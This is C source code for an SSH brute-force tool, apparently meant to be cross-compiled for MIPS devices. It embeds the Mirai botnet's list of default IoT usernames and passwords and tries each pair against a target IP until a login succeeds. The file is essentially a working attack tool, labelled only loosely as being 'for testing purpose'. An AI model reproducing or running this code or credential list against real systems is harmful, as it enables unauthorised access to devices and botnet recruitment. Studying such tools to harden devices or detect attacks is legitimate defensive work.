/*
 SSH Brute-force in C !
 Originally created for testing purpose.
Made by Kritpal Singh.
For any further query email me @ kritpal.sing@gmail.com
 Compiling:
$ /opt/buildroot-gcc463/usr/bin/mipsel-linux-gcc ssh_scan.c -o sscan -lssh -I./ssh/include -L./ssh/lib -lssl -lcrypto -L /home/kritpal/al3/source/lib/lib/

 Executing:
$ ./ssh_brute <ip> 
Note: you need libssh to compile it
# apt-get install libssh-dev
Already includes Mirai username and password list.
 * 
 */

#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <libssh/libssh.h>
#include <string.h>
#include <getopt.h>
#include <signal.h>

static int *cracked;

struct userPass {
    char user[20];
    char pass[20];
} uPass[62] = {
    {"root", "xc3511"},
    {"root", "vizxv"},
    {"root", "admin"},
    {"admin", "admin"},
    {"root", "888888"},
    {"root", "xmhdipc"},
    {"root", "default"},
    {"root", "juantech"},
    {"root", "123456"},
    {"root", "54321"},
    {"support", "support"},
    {"root", ""},
    {"admin", "password"},
    {"root", "root"},
    {"root", "12345"},
    {"user", "user"},
    {"admin", ""},
    {"root", "pass"},
    {"admin", "admin1234"},
    {"root", "1111"},
    {"admin", "smcadmin"},
    {"admin", "1111"},
    {"root", "666666"},
    {"root", "password"},
    {"root", "1234"},
    {"root", "klv123"},
    {"Administrator", "admin"},
    {"service", "service"},
    {"supervisor", "supervisor"},
    {"guest", "guest"},
    {"guest", "12345"},
    {"guest", "12345"},
    {"admin1", "password"},
    {"administrator", "1234"},
    {"666666", "666666"},
    {"888888", "888888"},
    {"ubnt", "ubnt"},
    {"root", "klv1234"},
    {"root", "Zte521"},
    {"root", "hi3518"},
    {"root", "jvbzd"},
    {"root", "anko"},
    {"root", "zlxx."},
    {"root", "7ujMko0vizxv"},
    {"root", "7ujMko0admin"},
    {"root", "system"},
    {"root", "ikwb"},
    {"root", "dreambox"},
    {"root", "user"},
    {"root", "realtek"},
    {"root", "00000000"},
    {"admin", "1111111"},
    {"admin", "1234"},
    {"admin", "12345"},
    {"admin", "54321"},
    {"admin", "123456"},
    {"admin", "7ujMko0admin"},
    {"admin", "1234"},
    {"admin", "pass"},
    {"admin", "meinsm"},
    {"tech", "tech"},
    {"mother", "fucker"}
};
char *USER = NULL;
char *HOST = NULL;

int ssh_brute(const char *user,const char *passwd_s) {
    //if (*cracked == 1) exit(0);
    printf("[*] Testing [%s: %s]\n", user, passwd_s);
    ssh_session ssh_id;
    ssh_id = ssh_new();
    int check;
    ssh_options_set(ssh_id, SSH_OPTIONS_HOST, HOST);
    ssh_options_set(ssh_id, SSH_OPTIONS_USER, user);

    if ((check = ssh_connect(ssh_id)) != SSH_OK) {
        ssh_free(ssh_id);
        return (-1);
    }

    if ((check = ssh_userauth_password(ssh_id, NULL, passwd_s)) != SSH_AUTH_SUCCESS) {
        ssh_free(ssh_id);
        return (-1);
    }

    ssh_disconnect(ssh_id);
    ssh_free(ssh_id);
//    *cracked = 1;
    printf("\n\n\tCracked --> [%s : %s]\n\n", user, passwd_s);
    return (1);
}

int main(int argc, char **argv) {
    
    int pos = 0;
    if (argc < 2) {
        printf("Require IP to attack.");
        return 0;
    }
    HOST = argv[1];
    printf("\n[+] Starting Attack\n");
    printf("[*] Host: %s\n", HOST);
    //printf("[*] User: %s\n",USER);
    //printf("[*] Wordlist: %s\n\n",file_name);
    int i = 0;
    //while ((C = fgetc(wordlist)) != EOF) {
    for (; i < 62; i++) {
        int ret=ssh_brute(uPass[i].user,uPass[i].pass);
        if(ret == 1){
            break;
        }
    }

    printf("\n[+] 100%% complete =)\n\n");
    return (0);
}
